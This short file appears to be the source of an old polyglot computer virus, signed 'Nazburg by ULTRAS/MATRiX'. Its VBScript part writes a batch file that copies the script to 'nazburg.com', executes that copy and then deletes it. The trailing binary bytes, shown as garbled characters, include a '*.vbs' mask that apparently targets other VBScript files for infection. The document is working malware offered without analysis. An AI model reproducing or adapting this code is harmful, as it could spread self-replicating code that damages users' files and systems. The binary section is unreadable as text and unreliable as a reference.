'�[
Dim a,f,s
Set a = Wscript.CreateObject("Wscript.Shell")
Set f = CreateObject("Scripting.FileSystemObject")
Set s = f.CreateTextFile("nazburg.bat", 2, False)
s.WriteLine "echo off"
s.WriteLine "copy " & Wscript.ScriptFullName & " nazburg.com>NUL"
s.WriteLine "nazburg.com"
s.WriteLine "del nazburg.com"
s.Close
a.Run ("nazburg.bat")

'�N���!rT��O�!rK�=���!r���>���?���!>�>9�t�B1�1��!�@����!�@>�����!�?���!���L�!*.vbsNazburg by ULTRAS/MATRiX
